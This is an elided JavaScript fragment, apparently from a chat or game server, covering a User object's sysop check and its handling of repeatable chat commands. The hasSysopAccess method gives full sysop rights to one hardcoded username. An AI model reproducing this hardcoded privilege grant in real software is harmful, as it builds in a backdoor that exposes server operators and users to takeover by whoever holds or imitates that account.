...
User = (function () {
	...
	User.prototype.hasSysopAccess = function () {
		if (this.userid === 'stevoduhhero') return true;
	...
	User.prototype.chat = function (message, room, connection) {
		...
		//mmo
		var allowRepeatedCommand = false,
				repeatableCommands = {
					"mmo": true,
					"leave": true,
					"utm": true,
				},
				command = message.substr(1).split(' ')[0];
		allowRepeatedCommand = repeatableCommands[command];

		if (allowRepeatedCommand || message.substr(0, 16) === '/cmd userdetails') {
